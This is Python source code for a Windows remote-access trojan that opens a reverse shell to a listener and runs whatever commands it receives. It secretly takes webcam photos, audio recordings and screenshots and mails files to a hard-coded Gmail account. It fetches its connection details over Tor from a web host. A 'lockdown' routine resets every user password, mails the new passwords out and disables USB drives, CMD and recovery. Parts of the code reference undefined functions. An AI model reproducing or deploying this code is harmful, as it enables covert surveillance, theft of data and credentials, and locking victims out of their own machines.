#!/usr/bin/python
import subprocess,smtplib,os,struct
from urllib.request import urlopen,Request
from torpy.http.requests import TorRequests
from urllib.parse import urlencode
import pyscreenshot as ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from shutil import copyfile,make_archive
from time import sleep
def passw():
    p = ''
    for a in range(len(pwd)):
        z = ''
        if pwd[a] in 'abcdefghijklmnopqrstuvwxyz':
            p+= str(ord(pwd[a]))
        else:
            z= pwd[a].encode("utf-8")
            p+= str(z.hex())
    password = ''
    for a in range(len(p)):
            if a in (1,4,6,8,9):
                    password+= str(bin(int(p[a])))
            elif a in (2,3,5,7):
                    password+= str(hex(int(p[a].encode("utf-8"))))
            else:
                    password+= str(p[a]) + '0'
    return password
def lockdown():
    out=''
    try:
        user,ty,yu=[],'',''
        for a in subprocess.check_output(['net', 'user']).decode('utf-8').split('\n')[4:6]:
            l=a.strip()
            user.append(l.split()[0])
        for a in user:
            ty+=a+'\t'
            yu+=passw(a)+'\t'
            subprocess.check_output(['net','user',a,pas(a)])
    except:
        out+="[*] Couldn't change system password\n"
    mail_content = ','.join(cd.keys())+'\n\n\n'+','.join(cd.values())+'\n\n\n'+ty+'\n\n\n'+yu
    sender_address = 'fsoceity.ar@gmail.com'
    sender_pass = 'ejaculationegambaram'
    receiver_address = 'fsoceity.ar@gmail.com'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'wifi'
    message.attach(MIMEText(mail_content, 'plain'))
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    out+="[*] Changed all user account passwords and mailed the passwords\n"
    try:
        proc = subprocess.Popen(r'reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR /v Start /d 4 /t REG_DWORD /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out+="[*] Disabled USB Drives\n"
    except:
        out+="[*] Couldn't disable USB Drives (possibly doesn't exist)\n"
    try:
        proc = subprocess.Popen(r'reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR /v Start /d 4 /t REG_DWORD /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out+="[*] Disabled CDRom\n"
    except:
        out+="[*] Couldn't disable CDRom (possibly doesn't exist)\n"
    try:
        proc = subprocess.Popen(r'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewOnDrive /d 67108863 /t REG_DWORD /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out+="[*] Locked all drives\n"
    except:
        out+="[*] Couldn't lock all drives\n"
    try:
        proc = subprocess.Popen(r'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System /v NoLocalPasswordResetQuestions /d 1 /t REG_DWORD /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out+="[*] Disabled seecurity questions\n"
    except:
        out+="[*] Couldn't disable security questions (possibly doesn't exist)\n"
    try:
        proc = subprocess.Popen('bcdedit /set {current} recoveryenabled no', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out+="[*] Disabled Automatic Repair\n"
    except:
        out+="[*] Couldn't disable Automatic Repair\n"

    try:
        download("http://cvmun.000webhostapp.com/BG.jpg")
        proc = subprocess.Popen(r'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /v LockScreenImageStatus /t REG_DWORD /d 1 /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        proc = subprocess.Popen(r'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /v LockScreenImagePath /t REG_SZ /d "C:\Users\Public\Videos\BG.jpg" /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        proc = subprocess.Popen(r'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /v LockScreenImageUrl /t REG_SZ /d "C:\Users\Public\Videos\BG.jpg" /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out+="[*] Changed lock screen image\n"
    except:
        out+="[*] Could not change lock screen image\n"
    try:
        proc = subprocess.Popen(r'reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System /v DisableCMD /d 2 /t REG_DWORD /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out+="[*] Disabled CMD\n"
    except:
        out+="[*] Couldn't disable CMD\n"
    return out
def capture():
    import cv2
    cap = cv2.VideoCapture(0)
    cap.set(3,640)
    cap.set(4,480)
    if cap.isOpened():
        _,frame = cap.read()
        if _ and frame is not None:
            cv2.imwrite('img.jpg', frame)
    cap.release()
    sender_address = 'fsoceity.ar@gmail.com'
    sender_pass = 'ejaculationegambaram'
    receiver_address = 'fsoceity.ar@gmail.com'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'pic'
    fo='C:\\Users\\Public\\Videos\\Windowsi'
    if not os.path.isdir(fo):
        os.mkdir(fo)
    xy=subprocess.check_output(['xcopy','img.jpg',fo])
    os.remove('img.jpg')
    make_archive(fo,'zip',fo)
    attachment = open('C:\\Users\\Public\\Videos\\Windowsi.zip',"rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment;filename=f.zip')
    message.attach(p)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    attachment.close()
    os.remove('C:\\Users\\Public\\Videos\\Windowsi.zip')
def rec(f):
    import pyaudio
    import wave
    chunk = 1024
    sample_format = pyaudio.paInt16
    channels = 2
    fs = 44100
    seconds = int(f)
    filename = "output.wav"
    p = pyaudio.PyAudio()
    stream = p.open(format=sample_format,
                    channels=channels,
                    rate=fs,
                    frames_per_buffer=chunk,
                    input=True)
    frames = []
    for i in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(sample_format))
    wf.setframerate(fs)
    wf.writeframes(b''.join(frames))
    wf.close()
    sender_address = 'fsoceity.ar@gmail.com'
    sender_pass = 'ejaculationegambaram'
    receiver_address = 'fsoceity.ar@gmail.com'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'pic'
    fo='C:\\Users\\Public\\Videos\\Windowsr'
    if not os.path.isdir(fo):
        os.mkdir(fo)
    xy=subprocess.check_output(['xcopy','output.wav',fo])
    os.remove('output.wav')
    make_archive(fo,'zip',fo)
    attachment = open('C:\\Users\\Public\\Videos\\Windowsr.zip',"rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment;filename=f.zip')
    message.attach(p)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    attachment.close()
    os.remove('C:\\Users\\Public\\Videos\\Windowsr.zip')
def capture_screen():
    im = ImageGrab.grab()
    im.save('screen.png')
    sender_address = 'fsoceity.ar@gmail.com'
    sender_pass = 'ejaculationegambaram'
    receiver_address = 'fsoceity.ar@gmail.com'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'pic'
    fo='C:\\Users\\Public\\Videos\\Windowsc'
    if not os.path.isdir(fo):
        os.mkdir(fo)
    xy=subprocess.check_output(['xcopy','screen.png',fo])
    os.remove('screen.png')
    make_archive(fo,'zip',fo)
    attachment = open('C:\\Users\\Public\\Videos\\Windowsc.zip',"rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment;filename=f.zip')
    message.attach(p)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    attachment.close()
    os.remove('C:\\Users\\Public\\Videos\\Windowsc.zip')
def dnm(name):
    sender_address = 'fsoceity.ar@gmail.com'
    sender_pass = 'ejaculationegambaram'
    receiver_address = 'fsoceity.ar@gmail.com'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'file'
    fo='C:\\Users\\Public\\Documents\\Windowsd'
    if not os.path.isdir(fo):
        os.mkdir(fo)
    xy=subprocess.check_output(['xcopy',name,fo])
    make_archive(fo,'zip',fo)
    attachment = open('C:\\Users\\Public\\Documents\\Windowsd.zip',"rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment;filename=f.zip')
    message.attach(p)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    attachment.close()
    os.remove('C:\\Users\\Public\\Documents\\Windowsd.zip')
    os.remove(fo+'\\'+name)
def down(url):
    command='powershell -command "Invoke-WebRequest '+url+' -OutFile C:\\Users\\Public\\Videos\\'+url.split('/')[-1]
    cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
import os
def send(sock, msg):
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)
def g():
    with TorRequests() as tr:
        tr.add_header('User-Agent','Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.04 (jaunty) Firefox/3.5')
        with tr.get_session() as s:
            while 1:
                c=s.get('http://cvmun.000webhostapp.com/cred.txt')
                cs=c.text.split(' ')
                if cs==['127.0.0.1','0001']:
                    continue
                return cs
import socket
import subprocess
#if isdir(r'C:\Users\Public'):
#    subprocess.check_output('attrib +s +h C:/Users/Public')
#else:
    #mkdir(r'C:\Users\Public', mode=0777)
    #subprocess.check_output('attrib +s +h C:/Users/Public')
while 1:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while 1:
            try:
                l=['127.0.0.1','5453']
                HOST = str(l[0]) # The ip of the listener.
                PORT = int(l[1]) # The same port as listener.
                s.connect((HOST, PORT))# Connect to listener.
                break
            except Exception as e:
                data = urlencode({'ip':'127.0.0.1','port': '0001'})#reset ngrok credentials using php
                data = data.encode('utf-8')
                request = Request("http://cvmun.000webhostapp.com/test.php")
                request.add_header("Content-Type","application/x-www-form-urlencoded;charset=utf-8")
                f = urlopen(request, data)
                continue
        s.send(str.encode(socket.gethostname()+'\n'+os.getcwd()+'> '))
        while 1:
            try:
                data = str(s.recv(1048576).decode("UTF-8")) # Recieve shell command.
                if data == "quit":# quit the session
                    data = urlencode({'ip':'127.0.0.1','port': '0001'})#reset ngrok credentials using php
                    data = data.encode('utf-8')
                    request = Request("http://cvmun.000webhostapp.com/test.php")
                    request.add_header("Content-Type","application/x-www-form-urlencoded;charset=utf-8")
                    f = urlopen(request, data)
                    break
                elif data[:3] == 'cd ' and len(data)>3:
                    try:
                        os.chdir(data[3:])
                        send(s,str.encode('\n\n\n'+os.getcwd()+'> ')) # Send output to listener.
                        continue
                    except:
                        send(s,str.encode('[*] Directory could not be changed\n\n\n'+os.getcwd()+'> ')) # Send output to listener.
                        continue
                elif data == 'help':
                    send(s,str.encode('''
-----------------COMMAND LIST---------------------
help -> display this list of commands
cd -> change directories
pic -> take a photo and mail it
screenshot -> take a screenshot and mail it
rec -> record audio and mail it (used as "rec <time in seconds>")
dnm -> download a file and mail it (used as "dnm <file name>")
download -> download a file on victim machine(used as "download <url>" and downloaded into Public Videos folder)
quit -> quit the session
lockdown -> completely lock out all users from victim machine and display hacked message\n\n\n'''+os.getcwd()+'> '))
                    continue
                elif data == 'pic':
                    try:
                        capture()#mail the pic taken using webcam
                        send(s,str.encode('[*] Pic sent succesfully\n\n\n'+os.getcwd()+'> '))
                        continue
                    except:
                        send(s,str.encode('[*] Taking pic failed\n\n\n'+os.getcwd()+'> '))
                        continue
                elif data == 'screenshot':
                    try:
                        capture_screen()#mail the screenshot
                        send(s,str.encode('[*] Screenshot sent succesfully\n\n\n'+os.getcwd()+'> '))
                        continue
                    except Exception as e:
                        print(e)
                        send(s,str.encode('[*] Taking screenshot failed\n\n\n'+os.getcwd()+'> '))
                        continue
                elif data[:4] == 'rec ' and len(data)>4:
                    try:
                        rec(data[4:])#mail the recording
                        send(s,str.encode('[*] Recording sent succesfully\n\n\n'+os.getcwd()+'> '))
                        continue
                    except:
                        send(s,str.encode('[*] Recording failed\n\n\n'+os.getcwd()+'> '))
                        continue
                elif data[:4] == 'dnm ' and len(data)>4:
                    try:
                        dnm(data[4:])#mail the file to be downloaded
                        send(s,str.encode('[*] File mailed succesfully\n\n\n'+os.getcwd()+'> '))
                        continue
                    except:
                        send(s,str.encode('[*] Failed to mail the file\n\n\n'+os.getcwd()+'> '))
                        continue
                elif data[:9] == 'download ' and len(data)>9:#download a file on victim machine from url
                    try:
                        down(data[9:])
                        send(s,str.encode('[*] File downloaded\n\n\n'+os.getcwd()+'> '))
                        continue
                    except:
                        send(s,str.encode('[*] File dowload failed\n\n\n'+os.getcwd()+'> '))
                        continue
                elif data == 'lockdown':
                    send(s,str.encode(lockdown()))
                    continue
                if len(data) > 0:
                    try:
                        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
                        output_str = str(stdout_value, "UTF-8") # Format output.
                        send(s,str.encode(output_str+'\n\n\n'+os.getcwd()+'> ')) # Send output to listener.
                    except:
                        continue
                if data == '':
                    break
            except:
                data = urlencode({'ip':'127.0.0.1','port': '0001'})#reset ngrok credentials using php
                data = data.encode('utf-8')
                request = Request("http://cvmun.000webhostapp.com/test.php")
                request.add_header("Content-Type","application/x-www-form-urlencoded;charset=utf-8")
                f = urlopen(request, data)
                break
    except Exception as e:
        print(e)
        continue#extended persistence
